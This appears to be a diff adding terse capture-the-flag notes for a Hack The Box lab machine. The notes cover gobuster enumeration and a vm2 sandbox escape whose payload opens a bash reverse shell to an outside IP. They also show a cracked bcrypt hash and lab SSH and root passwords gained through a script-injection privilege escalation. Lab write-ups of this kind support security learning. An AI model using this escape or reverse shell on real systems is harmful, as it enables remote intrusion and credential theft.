@@ -1,0 +1,74 @@
+Port 80 or 3000 will take us to the same website area, where we can
+test NODEJS CODE in a SANDBOX ENV
+
+Most likely we are dealing with some kind of Escaping method
+
+---- INFO -----
+Restricted Modules
+The following Node.js modules have been restricted from importing:
+    - child_process
+    - fs
+
+This is to prevent users from executing arbitrary system commands, which could be a major security risk.
+
+Module Whitelist
+
+Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing support@codify.htb while our ticketing system is being migrated.
+
+    - url
+    - crypto
+    - util
+    - events
+    - assert
+    - stream
+    - path
+    - os
+    - zlib
+---------------
+
+This box is very smart, we can't simply inject any bad lib into the code,
+it seems if a bad lib gets executed it is discovered and the program fails
+
+Running gobuster we find a /about that gives us a very nice piece of detail
+`The vm2 library` --> exploit this
+
+=== RCE to SVC ===
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+  
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('bash -c "bash -i >& /dev/tcp/10.10.15.68/4444 0>&1"');
+}
+`
+
+console.log(vm.run(code));
+==================
+
+There is a ticket.db in the web directory, inside is joshes cred hash
+`$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`
+
+john can auto ID hashes making life easier
+
+joshua:spongebob1 ==> SSH
+---------------------------------------
+The bash script we can run as root has bad sanitization, if we inject something
+into it, we may be able to break something and leak the root password using
+pspy.
+
+** READ STUFF CAREFULLY, THE PASS GETS MIXED WITH THE -p flag **
+
+root:kljh12k3jhaskjh12kjh3
